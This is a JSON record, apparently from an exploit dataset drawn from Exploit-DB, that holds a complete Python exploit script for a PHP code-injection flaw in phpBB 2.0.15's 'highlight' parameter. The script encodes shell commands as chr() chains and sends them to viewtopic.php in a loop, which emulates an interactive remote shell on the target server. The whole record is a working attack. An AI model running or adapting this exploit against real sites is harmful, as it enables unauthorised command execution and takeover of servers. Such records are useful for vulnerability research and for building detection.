{
  "id": "1076",
  "title": "phpBB 2.0.15 - &#039;highlight&#039; PHP Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "# tested and working /str0ke\r\n\r\n#!/usr/bin/pyth0n\r\n#\r\n###############################################################  this exploit for\r\n                                                              #  phpBB 2.0.15 \r\nprint \"\\nphpBB 2.0.15 arbitrary command execution eXploit\"    #  emulates a shell,\r\nprint \" 2005 by rattle@awarenetwork.org\"                      #  rather than \r\nprint \" well, just because there is none.\"                    #  sending a single\r\n                                                              #  command.\r\nimport sys                                                 ####\r\nfrom urllib2 import Request, urlopen\r\nfrom urlparse import urlparse, urlunparse\r\nfrom urllib import quote as quote_plus\r\n\r\nINITTAG = '<g0>'\r\nENDTAG  = '</g0>'\r\n\r\ndef makecmd(cmd):\r\n    return reduce(lambda x,y: x+'.chr(%d)'%ord(y),cmd[1:],'chr(%d)'%ord(cmd[0]))\r\n\r\n\r\n_ex  = \"%sviewtopic.php?t=%s&highlight=%%27.\"\r\n_ex += \"printf(\" + makecmd(INITTAG) + \").system(%s).\"\r\n_ex += \"printf(\" + makecmd(ENDTAG) + \").%%27\"\r\n\r\n\r\ndef usage():\r\n    print \"\"\"Usage: %s <forum> <topic>\r\n \r\n    forum - fully qualified url to the forum\r\n            example: http://www.host.com/phpBB/\r\n\r\n    topic - ID of an existing topic. Well you \r\n            will have to check yourself.\r\n\r\n\"\"\"[:-1] % sys.argv[0]; sys.exit(1)\r\n\r\n\r\nif __name__ == '__main__':\r\n\r\n    if len(sys.argv) < 3 or not sys.argv[2].isdigit():\r\n        usage()\r\n    else:\r\n        print\r\n        url = sys.argv[1]\r\n        if url.count(\"://\") == 0: \r\n            url = \"http://\" + url\r\n        url = list(urlparse(url))\r\n        host = url[1]\r\n        if not host: usage()\r\n\r\n        if not url[0]: url[0] = 'http'\r\n        if not url[2]: url[2] = '/'\r\n        url[3] = url[4] = url[5] = ''\r\n\r\n        url = urlunparse(url)\r\n\tif url[-1] != '/': url += '/'\r\n\r\n        topic = quote_plus((sys.argv[2]))\r\n\r\n        while 1:\r\n\r\n            try:\r\n                cmd = raw_input(\"[%s]$ \" % host).strip()\r\n                if cmd[-1]==';': cmd=cmd[:-1]\r\n\r\n                if (cmd == \"exit\"): break\r\n                else: cmd = makecmd(cmd)\r\n\t\t\r\n\t\tout = _ex % (url,topic,cmd)\r\n\r\n                try: ret = urlopen(Request(out)).read()\r\n                except KeyboardInterrupt: continue\r\n                except: pass\r\n\r\n                else:\r\n                    ret = ret.split(INITTAG,1)\r\n                    if len(ret)>1: ret = ret[1].split(ENDTAG,1)\r\n                    if len(ret)>1:\r\n                        ret = ret[0].strip();\r\n                        if ret: print ret\r\n                        continue;\r\n\r\n                print \"EXPLOIT FAILED\"\r\n\r\n            except:\r\n                continue\r\n\r\n# milw0rm.com [2005-06-29]",
  "url": "https://www.exploit-db.com/exploits/1076"
}